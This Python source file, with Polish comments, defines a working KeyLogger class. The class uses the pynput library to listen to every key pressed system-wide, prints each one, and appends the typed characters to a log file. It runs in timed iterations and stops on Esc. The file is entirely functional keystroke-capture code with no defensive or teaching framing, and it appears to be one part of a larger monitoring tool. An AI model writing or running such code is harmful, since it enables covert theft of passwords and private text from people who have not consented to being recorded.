from pynput.keyboard import Key, Listener
import time

from settings import time_iteration, filenames


class KeyLogger:

    def __init__(self, file_path):
        """
            Metoda inicjalizująca klasę KeyLogger
        """
        self.filename = filenames["keys"]
        self.file_path = "\\".join([file_path, self.filename])

        self.keys = []

        self.number_of_iterations = 0
        self.currentTime = time.time()
        self.stoppingTime = time.time() + time_iteration

    def run(self):
        """
            Metoda uruchamiająca Listener dla KeyLoggera
        """
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def on_press(self, key):
        """
            Metoda wyzwalana przez wciśnięcie klawisza
        """
        print(key)
        self.keys.append(key)
        self.currentTime = time.time()

        if len(self.keys) > 0:
            self.write_file()
            self.keys = []

    def write_file(self):
        """
            Metoda zapisująca do pliku wciśniete klawisze
        """
        with open(self.file_path, "a") as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(self, key):
        """
            Metoda sprawdzająca zdarzenia po puszczeniu dowolnego klawisza
            :return:
        """
        if key == Key.esc:
            self.after_stop()
            return False
        if self.currentTime > self.stoppingTime:
            self.after_stop()
            return False
        return True

    def after_stop(self):
        """
            Metoda wyzwalana po zakończeniu działania Listenera
        """
        self.number_of_iterations += 1

        self.currentTime = time.time()
        self.stoppingTime = time.time() + time_iteration
